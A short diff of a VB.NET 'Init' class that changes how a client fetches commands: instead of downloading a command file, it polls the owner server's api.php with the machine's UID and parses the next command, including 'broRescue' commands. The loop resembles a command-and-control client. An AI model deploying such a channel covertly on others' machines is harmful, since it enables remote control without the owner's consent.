@@ -1,4 +1,6 @@
-﻿Imports System.Runtime.InteropServices
+﻿Imports System.IO
+Imports System.Net
+Imports System.Runtime.InteropServices
 Public Class Init
     Dim threadReader As Threading.Thread
     Dim AFKTime As UInteger
@@ -42,14 +44,20 @@ Public Class Init
         Try
             While True
                 AddToLog("ReadingCommand@Init", "Reading command from server...")
-                Dim LocalCommandFile As String = DIRHome & "\[" & UID & "]broRescue.str"
-                Dim RemoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
-                If My.Computer.FileSystem.FileExists(LocalCommandFile) Then
-                    My.Computer.FileSystem.DeleteFile(LocalCommandFile)
-                End If
-                My.Computer.Network.DownloadFile(RemoteCommandFile, LocalCommandFile)
-                Dim filePath As String = DIRHome & "\[" & UID & "]broRescue.str"
-                Dim commandOne As String = IO.File.ReadAllLines(filePath)(1).Split(">"c)(1).Trim()
+
+                Dim request As HttpWebRequest = CType(WebRequest.Create(HttpOwnerServer & "/api.php"), HttpWebRequest)
+                request.ContentType = "application/x-www-form-urlencoded"
+                request.UserAgent = My.Application.Info.AssemblyName & " / " & compileVersion
+                request.Method = "GET"
+                request.Headers("ident") = UID
+                request.Headers("class") = "COMMAND"
+                Dim response As WebResponse = request.GetResponse()
+                Dim dataReader As New StreamReader(response.GetResponseStream())
+                Dim respuesta As String = dataReader.ReadToEnd()
+                response.Close()
+                dataReader.Close()
+
+                Dim commandOne As String = respuesta.Split(Environment.NewLine)(1).Split(">"c)(1).Trim()
                 If commandOne <> Nothing Then
                     If lastCommand <> commandOne Then
                         If commandOne.StartsWith("broRescue") Then
